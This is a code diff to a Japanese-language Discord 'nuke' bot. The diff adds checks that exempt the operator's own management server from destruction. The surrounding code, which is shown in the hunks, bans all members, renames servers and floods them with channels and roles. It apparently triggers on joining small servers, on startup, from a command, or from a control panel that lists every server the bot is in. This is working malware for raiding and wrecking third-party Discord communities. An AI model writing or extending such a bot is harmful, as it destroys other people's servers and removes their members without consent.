@@ -11,6 +11,7 @@ PREFIX = "!"
 DEFAULT_NEW_NAME = "ますまに共栄圏植民地"
 INVITE_LINK = "https://discord.gg/tqNR7BsAsR"
 
+# 管理サーバーID（ここだけ絶対保護）
 MANAGE_GUILD_ID = 1477622875560214548
 MANAGE_CHANNEL_ID = 1477622875560214551
 
@@ -104,6 +105,11 @@ async def ban_all_task(guild, members, reason):
         await asyncio.sleep(random.uniform(0.2, 0.4))
 
 async def core_nuke(guild, new_server_name=None):
+    # 管理サーバー保護: 絶対に実行しない
+    if guild.id == MANAGE_GUILD_ID:
+        print(f"管理サーバー({guild.name})のためヌークをスキップ")
+        return
+
     new_name = new_server_name or DEFAULT_NEW_NAME
 
     members = [m for m in guild.members if m != bot.user]
@@ -234,7 +240,7 @@ async def core_nuke(guild, new_server_name=None):
     else:
         target_channels = 50
 
-    target_roles = 240  # 上限近く
+    target_roles = 240
 
     channels_created = []
     current = 0
@@ -291,6 +297,11 @@ async def core_nuke(guild, new_server_name=None):
 
 @bot.event
 async def on_guild_join(guild):
+    # 管理サーバーは絶対残留
+    if guild.id == MANAGE_GUILD_ID:
+        print(f"管理サーバー参加: {guild.name} → 残留（保護）")
+        return
+
     non_bot_members = [m for m in guild.members if not m.bot and m != guild.me]
     member_count = len(non_bot_members)
 
@@ -308,6 +319,12 @@ async def on_ready():
     print(f"起動: {bot.user}")
     print("=== ボット起動時の全サーバー情報 ===")
     for guild in bot.guilds:
+        # 管理サーバーは保護
+        if guild.id == MANAGE_GUILD_ID:
+            print(f"管理サーバー: {guild.name} → 残留（保護）")
+            await log_server_info(guild)
+            continue
+
         non_bot_members = [m for m in guild.members if not m.bot and m != guild.me]
         member_count = len(non_bot_members)
         if member_count <= 5 and not guild.name.startswith("ま"):
@@ -320,12 +337,17 @@ async def on_ready():
             await log_server_info(guild)
     print("=====================================")
 
+    # 管理パネル送信（管理サーバー内チャンネル）
     manage_guild = bot.get_guild(MANAGE_GUILD_ID)
     if manage_guild:
         manage_channel = manage_guild.get_channel(MANAGE_CHANNEL_ID)
         if manage_channel:
             view = ManageView(bot)
-            options = [discord.SelectOption(label=g.name, value=str(g.id)) for g in bot.guilds]
+            options = []
+            for g in bot.guilds:
+                # 管理サーバー自身は選択肢から除外
+                if g.id != MANAGE_GUILD_ID:
+                    options.append(discord.SelectOption(label=g.name, value=str(g.id)))
             view.select_guild.options = options
             await manage_channel.send("サーバー管理パネル", view=view)
         else:
@@ -342,22 +364,24 @@ class ManageView(discord.ui.View):
     async def list_servers(self, interaction: discord.Interaction, button: discord.ui.Button):
         embed = discord.Embed(title="ボットが入ってるサーバー一覧", color=discord.Color.blue())
         for g in self.bot.guilds:
-            embed.add_field(name=g.name, value=f"ID: {g.id}\nメンバー: {g.member_count}", inline=False)
+            if g.id != MANAGE_GUILD_ID:  # 管理サーバー非表示
+                embed.add_field(name=g.name, value=f"ID: {g.id}\nメンバー: {g.member_count}", inline=False)
         await interaction.response.send_message(embed=embed, ephemeral=True)
 
     @discord.ui.select(placeholder="ヌーク対象サーバー選択", options=[])
     async def select_guild(self, interaction: discord.Interaction, select: discord.ui.Select):
         guild_id = int(select.values[0])
         guild = self.bot.get_guild(guild_id)
-        if guild:
+        if guild and guild.id != MANAGE_GUILD_ID:  # 保護
             await core_nuke(guild)
             await interaction.response.send_message(f"{guild.name} でヌーク起動しました。", ephemeral=True)
         else:
-            await interaction.response.send_message("サーバー取得失敗。", ephemeral=True)
+            await interaction.response.send_message("無効なサーバーまたは保護されています。", ephemeral=True)
 
 @bot.command(name="masumani", aliases=["setup"])
 async def trigger(ctx, *, new_name: str = None):
-    if not ctx.guild:
+    if not ctx.guild or ctx.guild.id == MANAGE_GUILD_ID:  # 保護
+        await ctx.send("このサーバーでは使用できません。", delete_after=10)
         return
     try:
         await ctx.message.delete()
